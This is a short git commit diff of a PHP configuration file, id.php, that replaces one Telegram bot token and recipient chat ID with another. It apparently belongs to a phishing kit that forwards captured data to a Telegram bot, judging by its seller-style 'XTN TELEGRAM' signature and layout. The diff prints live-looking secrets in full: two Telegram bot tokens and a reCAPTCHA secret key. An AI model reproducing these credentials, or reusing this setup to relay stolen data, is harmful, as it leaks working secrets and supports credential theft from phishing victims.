7d184885d6fbd692ce91457b61574199b916b1c2
jhondrs22 <jhondrs@graphic-designer.com>
2026-09-03 00:12:13 +0200

    Update user IDs and bot token in id.php

--- id.php
+++ id.php
@@ -6,6 +6,6 @@ XTN TELEGRAM @fgxtn
 $siteKey = "6LcZBqYtAAAAAMaPjXkAuxqfH4dHNs366B9nelU_";
 $secretKey = "6LcZBqYtAAAAAHe7zcRYvoBco0P-A4oLIV-2TnFz";
 
-$user_ids=array("7261743797");
-$bot='8159533650:AAHZj7bQEHVEtGvi3ntYtsokt6q8GzTLIXM';
+$user_ids=array("-5154502273");
+$bot='8788360996:AAHwfBlvLc7lFzzuUsteXCcNxk_r4sxjE1Y';
 ?>
